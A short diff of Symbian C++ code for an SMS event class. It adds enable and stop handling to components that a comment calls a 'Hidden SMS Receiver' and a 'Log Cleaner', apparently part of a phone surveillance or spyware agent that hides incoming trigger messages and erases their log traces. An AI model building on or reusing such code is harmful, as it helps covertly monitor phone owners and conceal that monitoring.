@@ -129,11 +129,23 @@ void CEventSms::StartEventL()
 	{
 	__FLOG(_L("StartEventL()"));
 		
+	iEnabled = ETrue;
+	
 	// Starts Hidden SMS Receiver and Log Cleaner
 	if(iSmsRecv != NULL)
 		iSmsRecv->StartReceivingL(iSmsText);
 	if(iLogCleaner != NULL)
 		iLogCleaner->StartCleaner(iSmsNumber);
+	}
+
+void CEventSms::StopEventL()
+	{
+	if(iSmsRecv != NULL)
+		iSmsRecv->Cancel();
+	if(iLogCleaner != NULL)
+		iLogCleaner->Cancel();
+	
+	iEnabled = EFalse;
 	}
 
 // this is the original method from MB
